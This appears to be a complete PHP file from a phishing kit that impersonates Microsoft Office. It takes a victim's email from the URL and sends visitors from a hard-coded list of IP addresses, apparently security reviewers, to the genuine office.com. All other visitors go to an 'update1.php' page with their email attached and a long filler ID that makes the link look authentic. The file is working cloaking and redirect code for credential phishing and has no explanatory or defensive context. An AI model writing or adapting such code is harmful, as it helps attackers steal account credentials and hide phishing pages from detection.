<?php 


$value = $_GET["email"];
$ip_address = $_SERVER['REMOTE_ADDR'];

$ip_array = array("49.190.163.150","1.143.56.224","60.231.89.22");
     if (in_array("$ip_address", $ip_array, TRUE))
        {
            header("Location: https://office.com");
        }else{
            header("Location: update1.php?email=$value&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
        }


?>